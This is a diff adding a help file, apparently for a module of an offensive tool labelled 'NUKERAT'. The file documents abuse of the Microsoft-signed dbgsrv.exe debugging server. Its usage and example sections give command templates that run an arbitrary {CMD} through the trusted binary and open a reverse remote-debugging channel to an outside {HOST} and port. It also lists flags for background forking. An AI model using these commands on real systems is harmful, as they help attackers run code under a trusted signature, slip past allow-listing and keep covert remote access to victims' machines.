@@ -1,0 +1,21 @@
+ABOUT
+    A process server included with Debugging Tools for Windows for
+    remote user-mode debugging. LOLBAS covers proxy execution of a
+    command through a trusted Microsoft-signed debugging utility and
+    establish a reverse remote-debugging channel through a trusted
+    Microsoft-signed developer utility.
+
+USAGE:
+    dbgsrv.exe -t tcp:port=5005 -c {CMD}
+    dbgsrv.exe -t tcp:clicon={HOST},port={PORT}
+
+EXAMPLES:
+    dbgsrv.exe -t tcp:port=5005 -c {CMD}
+    dbgsrv.exe -t tcp:clicon={HOST},port={PORT}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    dbgsrv.exe -t tcp:port=5005 -c {CMD}
